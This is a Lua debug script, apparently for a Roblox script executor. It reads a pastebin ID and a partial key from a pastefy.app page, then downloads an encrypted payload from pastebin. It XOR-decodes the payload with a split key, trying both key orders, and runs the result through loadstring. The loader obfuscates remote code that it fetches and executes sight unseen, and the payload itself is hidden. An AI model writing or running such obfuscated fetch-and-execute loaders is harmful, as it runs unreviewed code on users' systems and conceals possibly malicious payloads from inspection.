-- TESTER: tenta A..B e B..A, mostra resultados
local pastefy_raw = "https://pastefy.app/0NhYgFqH/raw"
local key_part_a = "0+;p-%d>#*3"

local function getRaw(u)
    local ok,r = pcall(function() return game:HttpGet(u, true) end)
    if not ok then
        warn("HTTP FAIL "..tostring(u).." -> "..tostring(r))
        return nil
    end
    return r
end

local function xor_decode(data, key)
    local out={}
    local l=#key
    for i=1,#data do
        local b=string.byte(data,i)
        local kb=string.byte(key,((i-1)%l)+1)
        out[i]=string.char(bit32.bxor(b,kb))
    end
    return table.concat(out)
end

warn("TEST 1 - getting pastefy")
local pf = getRaw(pastefy_raw)
if not pf then return end
pf = pf:gsub("\r",""):gsub("\n","")
warn("TEST pastefy raw: "..tostring(pf))

local id, partb = pf:match("^([^|]+)|(.+)$")
if not id then
    warn("TEST bad pastefy format: "..tostring(pf))
    return
end
warn("TEST pastebin id: "..tostring(id).." key_part_b len: "..#partb)

local enc = getRaw("https://pastebin.com/raw/"..id)
if not enc then return end
warn("TEST encrypted len: "..#enc.." sample: "..string.sub(enc,1,120))

local tries = {
    {name="A..B", key = key_part_a .. partb},
    {name="B..A", key = partb .. key_part_a},
}

for _,t in ipairs(tries) do
    warn("TRY "..t.name.." keylen="..#t.key)
    local ok, decoded = pcall(function() return xor_decode(enc, t.key) end)
    if not ok then
        warn("TRY "..t.name.." decode error: "..tostring(decoded))
    else
        warn("TRY "..t.name.." decoded len="..#decoded.." sample: "..string.sub(decoded,1,300))
        local ls = loadstring(decoded)
        warn("TRY "..t.name.." loadstring type: "..tostring(type(ls)))
        if type(ls) == "function" then
            warn("TRY "..t.name.." SUCCESS - executing now")
            local ok2, err2 = pcall(function() ls() end)
            if not ok2 then
                warn("TRY "..t.name.." exec error: "..tostring(err2))
            else
                warn("TRY "..t.name.." exec ok")
            end
            return
        else
            warn("TRY "..t.name.." NOT lua chunk")
        end
    end
end

warn("TEST FINISHED - nenhum key order funcionou. Copia tudo e me manda o output das WARN lines.")
